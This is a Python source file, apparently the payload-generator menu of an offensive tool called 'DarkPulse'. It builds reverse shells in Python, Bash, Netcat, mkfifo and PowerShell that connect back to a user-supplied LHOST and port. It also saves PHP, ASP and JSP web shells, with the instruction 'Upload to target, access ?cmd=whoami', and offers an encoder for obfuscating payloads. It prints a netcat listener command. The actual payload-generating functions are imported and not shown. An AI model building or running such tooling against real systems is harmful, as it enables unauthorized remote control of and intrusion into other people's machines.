import os
from core.config import *
from core.exploit import *

def menu():
    while True:
        print(f"\n{R2}{B}  ╔══════════════════════════════════════════╗{E}")
        print(f"  {R2}║{E}  {R3}{B}💀 PAYLOAD GENERATOR{E}                    {R2}║{E}")
        print(f"  {R2}╠══════════════════════════════════════════╣{E}")
        print(f"  {R2}║{E}  {G2}[1]{E} Python Reverse Shell               {R2}║{E}")
        print(f"  {R2}║{E}  {G2}[2]{E} Bash Reverse Shell                 {R2}║{E}")
        print(f"  {R2}║{E}  {G2}[3]{E} Netcat Reverse Shell               {R2}║{E}")
        print(f"  {R2}║{E}  {G2}[4]{E} Netcat mkfifo Shell                {R2}║{E}")
        print(f"  {R2}║{E}  {G2}[5]{E} PowerShell Reverse Shell           {R2}║{E}")
        print(f"  {R2}║{E}  {G2}[6]{E} PHP Web Shell                      {R2}║{E}")
        print(f"  {R2}║{E}  {G2}[7]{E} ASP Web Shell                      {R2}║{E}")
        print(f"  {R2}║{E}  {G2}[8]{E} JSP Web Shell                      {R2}║{E}")
        print(f"  {R2}║{E}  {G2}[9]{E} Payload Encoder/Decoder            {R2}║{E}")
        print(f"  {R2}║{E}  {G2}[0]{E} Back                               {R2}║{E}")
        print(f"  {R2}╚══════════════════════════════════════════╝{E}")
        c = input(f"\n  {R3}DarkPulse/PAYLOAD>{E} ").strip()
        if c == "0": break
        elif c in "12345":
            lhost = input(f"  {GD}LHOST:{E} ").strip()
            lport = input(f"  {GD}LPORT (4444):{E} ").strip() or "4444"
            if not lhost: print(f"  {R}[-] No LHOST{E}"); continue
            shell = ""
            if c == "1": shell = gen_python_revshell(lhost, lport)
            elif c == "2": shell = gen_bash_revshell(lhost, lport)
            elif c == "3": shell = gen_nc_revshell(lhost, lport)
            elif c == "4": shell = gen_nc_mkfifo(lhost, lport)
            elif c == "5": shell = gen_powershell_revshell(lhost, lport)
            names = {"1":"Python","2":"Bash","3":"Netcat","4":"Netcat mkfifo","5":"PowerShell"}
            print(f"\n  {R2}{B}  [!] {names[c]} Reverse Shell → {lhost}:{lport}{E}")
            print(f"  {R3}  {'─'*55}{E}")
            print(f"  {G2}  {shell}{E}")
            print(f"  {R3}  {'─'*55}{E}")
            print(f"\n  {GD}  Listener: nc -lvnp {lport}{E}")
            save = input(f"\n  {GD}Save to file? (y/n):{E} ").strip().lower()
            if save == "y":
                fname = input(f"  {GD}Filename:{E} ").strip() or f"shell_{c}.txt"
                with open(fname, "w") as f:
                    f.write(shell)
                print(f"  {G}[+] Saved: {fname}{E}")
        elif c == "6": _save_shell("PHP", gen_php_webshell(), "shell.php")
        elif c == "7": _save_shell("ASP", gen_asp_webshell(), "shell.aspx")
        elif c == "8": _save_shell("JSP", gen_jsp_webshell(), "shell.jsp")
        elif c == "9": encoder_menu()

def _save_shell(name, code, default):
    print(f"\n  {R2}{B}  [!] {name} Web Shell Generated{E}")
    print(f"  {R3}  {'─'*55}{E}")
    for line in code.split("\n")[:5]:
        print(f"  {G2}  {line}{E}")
    print(f"  {D}  ... ({len(code)} bytes total){E}")
    print(f"  {R3}  {'─'*55}{E}")
    save = input(f"\n  {GD}Save? (y/n):{E} ").strip().lower()
    if save == "y":
        fname = input(f"  {GD}Filename ({default}):{E} ").strip() or default
        with open(fname, "w") as f:
            f.write(code)
        print(f"  {G}[+] Saved: {fname}{E}")
        print(f"  {GD}  Usage: Upload to target, access ?cmd=whoami{E}")

def encoder_menu():
    while True:
        print(f"\n  {GD}{B}  ENCODER/DECODER{E}")
        print(f"  {G2}[1]{E} Base64 Encode    {G2}[5]{E} Base64 Decode")
        print(f"  {G2}[2]{E} Hex Encode       {G2}[6]{E} Hex Decode")
        print(f"  {G2}[3]{E} URL Encode       {G2}[7]{E} URL Decode")
        print(f"  {G2}[4]{E} ROT13            {G2}[8]{E} Binary Encode")
        print(f"  {G2}[9]{E} Octal Encode     {G2}[0]{E} Back")
        c = input(f"\n  {R3}DarkPulse/ENCODER>{E} ").strip()
        if c == "0": break
        text = input(f"  {GD}Input text:{E} ").strip()
        if not text: continue
        result = ""
        if c == "1": result = encode_b64(text)
        elif c == "2": result = encode_hex(text)
        elif c == "3": result = encode_url(text)
        elif c == "4": result = encode_rot13(text)
        elif c == "5": result = decode_b64(text)
        elif c == "6": result = decode_hex(text)
        elif c == "7": result = decode_url(text)
        elif c == "8": result = encode_binary(text)
        elif c == "9": result = encode_octal(text)
        else: continue
        print(f"\n  {R2}{B}  Result:{E}")
        print(f"  {G2}  {result}{E}")
